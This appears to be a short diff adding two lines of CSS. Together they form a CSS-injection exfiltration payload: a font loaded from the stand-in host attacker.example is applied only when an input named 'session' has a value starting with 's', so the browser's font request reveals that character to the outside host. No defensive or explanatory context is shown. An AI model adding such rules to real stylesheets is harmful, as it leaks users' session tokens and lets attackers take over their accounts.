@@ -1,0 +1,2 @@
+@font-face { font-family: leak-s; src: url("https://attacker.example/font-s.woff2"); }
+input[name="session"][value^="s"] ~ .probe { font-family: leak-s, sans-serif; }
